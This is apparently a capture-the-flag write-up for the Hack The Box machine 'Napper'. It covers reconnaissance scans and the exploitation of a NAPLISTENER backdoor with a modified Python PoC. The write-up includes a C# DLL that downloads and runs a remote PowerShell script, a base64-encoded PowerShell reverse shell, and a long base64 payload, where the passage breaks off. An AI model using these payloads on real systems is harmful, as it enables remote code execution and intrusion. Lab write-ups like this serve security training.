# Napper

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV 10.129.5.130
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 19:02 UTC
Nmap scan report for 10.129.5.130
Host is up (0.12s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
443/tcp open  ssl/http Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2023-11-11T19:03:45+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
|_http-title: Research Blog | Home 
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Hugo 0.112.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3s

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   48.43 ms  10.10.16.1
2   101.30 ms 10.129.5.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.81 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.129.5.130
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 19:45 UTC
Nmap scan report for napper.htb (10.129.5.130)
Host is up (0.099s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
443/tcp  open  ssl/http   Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Research Blog | Home 
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2023-11-11T19:49:11+00:00; +1s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-generator: Hugo 0.112.3
7680/tcp open  pando-pub?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   53.58 ms 10.10.16.1
2   79.84 ms napper.htb (10.129.5.130)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.23 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.5.130
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 19:49 UTC
Nmap scan report for napper.htb (10.129.5.130)
Host is up (0.033s latency).
All 1000 scanned ports on napper.htb (10.129.5.130) are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6784.14 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.5.130    napper.htb
10.129.5.130    app.napper.htb
```

### Enumeration of Port 443/TCP

The certificate was issued by `ca.napper.htb`.

> https://napper.htb/

> https://app.napper.htb/

> https://app.napper.htb/posts/setup-basic-auth-powershell/

```c
New-LocalUser -Name "example" -Password (ConvertTo-SecureString -String "ExamplePassword" -AsPlainText -Force)
```

| Username | Password |
| --- | --- |
| example | ExamplePassword |

### Subdomain Enumeration with ffuf

```c
┌──(user㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.napper.htb" -u https://napper.htb/ --fs 5602

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://napper.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.napper.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5602
________________________________________________

internal                [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 29ms]
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.5.130    napper.htb
10.129.5.130    app.napper.htb
10.129.5.130    ca.napper.htb
10.129.5.130    internal.napper.htb
```

> https://internal.napper.htb

> https://internal.napper.htb/posts/first-re-research/

> https://internal.napper.htb/sitemap.xml

> https://napper.htb/ews/MsExgHealthCheckd/

> https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph

PoC from PNG file in the blog post mentioned above.

```c
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

hosts = ["192.168.1.191"]
payload = "TVqQAAMAAAAEAAAA...JAAA"
form_field = f"sdafwe3rwe23={requests.utils.quote(payload)}"

for h in hosts:
    url_ssl = f"https://{h}/ews/MsExgHealthCheckd/"

    try:
        r_ssl = requests.post(url_ssl, data=form_field, verify=False)
        print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
    except KeyboardInterrupt:
        exit()
    except Exception as e:
        print(e)
        pass
```

I created a new `Class Library (.Net Framework)` in `Visual Studio 2022` with `.Net Framework 4.6.2`.

payload.dll

```c
using System;
using System.Diagnostics;
using System.Net;

namespace payload
{
    public class Run
    {
        public Run()
        {
            string scriptUrl = "http://10.10.16.42/x.ps1";
            string scriptContent = new WebClient().DownloadString(scriptUrl);

            Process.Start(new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = scriptContent,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            });
        }

        public static void Main(string[] args)
        {
            new Run();
        }
    }
}

```

Next I went to cyberchef and `Base64` encoded the dll.

> https://cyberchef.io/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjAuMi4yMCcsIDQ0Myk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki

```c
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aW9uaW5nAERvd25sb2FkU3RyaW5nAHBheWxvYWQuZGxsAFN5c3RlbQBNYWluAFN5c3RlbS5SZWZsZWN0aW9uAFJ1bgBQcm9jZXNzU3RhcnRJbmZvAHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGFyZ3MAUHJvY2VzcwBzZXRfQXJndW1lbnRzAE9iamVjdABTeXN0ZW0uTmV0AFdlYkNsaWVudABTdGFydABzZXRfUmVkaXJlY3RTdGFuZGFyZE91dHB1dABzZXRfQ3JlYXRlTm9XaW5kb3cAAAAAADFoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADIAOQAvAHgALgBwAHMAMQAAHXAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAAAAAA8M84DYLAeUGfdogilUBXrgAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBAcCDg4EIAEODgYAARJNEkkIt3pcVhk04IkFAAEBHQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAADAEAB3BheWxvYWQAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMjMAACkBACQ2ZTVlYmZhNS03YmEwLTQ0MzktYjIyMC05NDdlYWEwOWE3YjQAAAwBAAcxLjAuMC4wAABNAQAcLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjYuMgEAVA4URnJhbWV3b3JrRGlzcGxheU5hbWUULk5FVCBGcmFtZXdvcmsgNC42LjIAAAAAAEy+TtgAAAAAAgAAAGMAAAAEKAAABAoAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RT/t6qXyZQ7kq1J8QkApz6vgEAAABaOlxodGJcbWFjaGluZXNcbmFwcGVyXGZpbGVzXHBheWxvYWRccGF5bG9hZFxwYXlsb2FkXG9ialxEZWJ1Z1xwYXlsb2FkLnBkYgCPKAAAAAAAAAAAAACpKAAAACAAAAAAAAAAAAAAAAAAAAAAAAAA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
```

Modified PoC:

```c
┌──(user㉿kali)-[/media/…/htb/machines/napper/files]
└─$ cat poc.py 
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

hosts = ["10.129.5.130"]
payload = "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aW9uaW5nAERvd25sb2FkU3RyaW5nAHBheWxvYWQuZGxsAFN5c3RlbQBNYWluAFN5c3RlbS5SZWZsZWN0aW9uAFJ1bgBQcm9jZXNzU3RhcnRJbmZvAHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGFyZ3MAUHJvY2VzcwBzZXRfQXJndW1lbnRzAE9iamVjdABTeXN0ZW0uTmV0AFdlYkNsaWVudABTdGFydABzZXRfUmVkaXJlY3RTdGFuZGFyZE91dHB1dABzZXRfQ3JlYXRlTm9XaW5kb3cAAAAAADFoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADIAOQAvAHgALgBwAHMAMQAAHXAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAAAAAA8M84DYLAeUGfdogilUBXrgAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBAcCDg4EIAEODgYAARJNEkkIt3pcVhk04IkFAAEBHQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAADAEAB3BheWxvYWQAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMjMAACkBACQ2ZTVlYmZhNS03YmEwLTQ0MzktYjIyMC05NDdlYWEwOWE3YjQAAAwBAAcxLjAuMC4wAABNAQAcLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjYuMgEAVA4URnJhbWV3b3JrRGlzcGxheU5hbWUULk5FVCBGcmFtZXdvcmsgNC42LjIAAAAAAEy+TtgAAAAAAgAAAGMAAAAEKAAABAoAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RT/t6qXyZQ7kq1J8QkApz6vgEAAABaOlxodGJcbWFjaGluZXNcbmFwcGVyXGZpbGVzXHBheWxvYWRccGF5bG9hZFxwYXlsb2FkXG9ialxEZWJ1Z1xwYXlsb2FkLnBkYgCPKAAAAAAAAAAAAACpKAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAmygAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAAwDAAAAAAAAAAAAAAwDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsARsAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAABIAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAOAAIAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAHAAYQB5AGwAbwBhAGQAAAAwAA